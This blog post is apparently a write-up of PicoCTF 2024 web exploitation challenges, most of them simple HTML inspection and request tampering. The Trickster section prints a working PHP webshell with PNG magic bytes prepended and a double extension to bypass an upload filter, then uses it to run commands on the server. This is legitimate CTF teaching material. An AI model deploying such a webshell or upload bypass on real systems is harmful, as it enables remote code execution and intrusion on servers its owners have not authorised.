I have considered myself... practically done with the Forensics category for PicoCTF 2024. It truly is a guessfest whether or not your first solution is correct - I can't believe throwing out a random `find` into the command-line actually gave me the answer for [Mob psycho](picoctf-2024-forensics#mob-psycho)...

Well, here we go again, this time in my arguably best non-forensics category - Web Exploitation! Once again, I will be going through each of the challenges and solving them, while writing out my thought process for each challenge.

> Same thing as Forensics, this blogpost will describe the challenges and give the solutions to them - but I will not be giving out the flag in its entirety. All solutions with the flag in plain text will have the flag replaced by `picoCTF{flag}`.

# WebDecode

> **Difficulty**: Easy \
> **Categories**: none

Well... We're thrown straight into a website that looks *really* suspicious. I'll perform due dilligence and... inspect the site HTML. Nothing in the home page, so I'll go into the About page.

And upon loading the About page, wow, the **very loud** text saying "Try inspecting the page!! You might find it there" really confirms that I'm getting somewhere.

Hitting F12 to open up my DevTools and I immediately see a weird section of HTML:

```html
<section class="about" notify_true="cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDdiOTFjNzl9">
   <h1>
    Try inspecting the page!! You might find it there
   </h1>
   <!-- .about-container -->
  </section>
```

That string looks very suspicious. One quick run into the base64 decoder again, using:

```
$ echo "cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDdiOTFjNzl9" | base64 -d
```

Aaaaaaaaand we've got it! Very simple challenge.

# Unminify

> **Difficulty**: Easy \
> **Categories**: obfuscation, minification

Yet another webpage, similar to [WebDecode](#web-decode) above. Once again, let's open up our DevTools and scan through the HTML.

It didn't take long before I reached this section of HTML:

```html
<p class="picoCTF{flag}"></p>
```

That's our flag, time to copy it and submit it.

# Bookmarklet

> **Difficulty**: Easy \
> **Categories**: obfuscation, browser

The website gives us another site, in the same template as [Unminify](#unminify). It also gives us a JavaScript bookmarklet to run as well. As it describes itself, it's a bookmarklet - very similar to my Kamaitachi maimai DX [import script](https://github.com/j1nxie/kt-maimaidx-site-importer). Let's create a quick bookmark and throw this in as the URL.

As soon as we click the bookmarklet, the flag shows up as an alert!

# IntroToBurp

> **Difficulty**: Easy \
> **Categories**: none

Well, as described by the challenge name, we'll need [BurpSuite](https://portswigger.net/burp) for this. Let's pull up BurpSuite and open the website in BurpSuite's browser (Proxy > Intercept > Turn on Intercept).

We see a little form that tells us to put our information in, and being the sane person that I am, I will put in my fully 100% real information into this.

Hitting the Register button, while forwarding the packet as-is to the server, brings us to another form.

It's asking for an OTP code... but I haven't received anything. Weird. Let's try throwing in a random string... like `a` and submit it. BurpSuite nicely catches that request for us, and we can see the form data `otp=a` in the raw request packet. Let's try... removing that and see what happens!

After removing the OTP code from the form data, we got ourselves a nice malformed... well... form data sent over the wire. Let's see how the server reacts... And we got our flag!

# Trickster

> **Difficulty**: Medium \
> **Categories**: none

This is actually... a pretty tough one if you don't know where to immediately start. I opened up the site that the challenge gave, and there was no clear entry points to... anything, really. Uploading a PNG only gets a result string shown to you, like below.

![Screenshot of Trickster form](/assets/img/picoctf/trickster1.png)

I tried accessing a random directory, e.g. `atlas.picoctf.net:<port>/what`, and I got a 404 Not Found. That's expected. I also see this is running Apache, which means... there's PHP. But we haven't seen any clear entry points to get an arbitrary PHP script running here.

Let's get back to the root site. Sitting here won't do us any good, I guess it's time to use some tools? Using `gobuster`, and running a brute-force for URIs like such:

```

```

We're seeing `robots.txt` that we can access, and `/uploads` being redirected to the root directory - looks like there's gonna be an accessible folder there. Let's try accessing `robots.txt`...

```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

So the *very root* directory of `/uploads/` is not crawled, along with the file `instructions.txt`. Let's try looking at `instructions.txt`.

```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

Interesting... It looks like this doesn't do much validation on the PNG files themselves, other than checking for the `.png` extension *existing* in the file name, and the first few bytes containing `PNG`. I guess the uploaded files will also be stored under `/uploads/<file_name>`? That's an entry for our PHP now, no?

I will modify [easy-simple-php-webshell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985) a tiny bit, so it has the magic bytes for PNG at the top.

```php
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

Along with that, I'll add the `.png` extension, saving it as `webshell.png.php` so it passes the extension check. Let's try uploading this. The form accepted it without any complaints! Time to try accessing this webshell under `/uploads/webshell.png.php`.

We're in. Let's try running `ls ../` to see the root directory. There's a weird file with the name `MQZWCYZWGI2WE.txt`. A simple `cat` on this file finally gives us the flag we're looking for!

# Afterwords

The final challenge of this category - titled "elements", honestly deserves a post of its own. It's of another level, and I've never seen myself so stuck on one. With that being said, that's practically all the solvable web challenges for PicoCTF 2024 as of writing this post. Thank you all for reading through to the end!
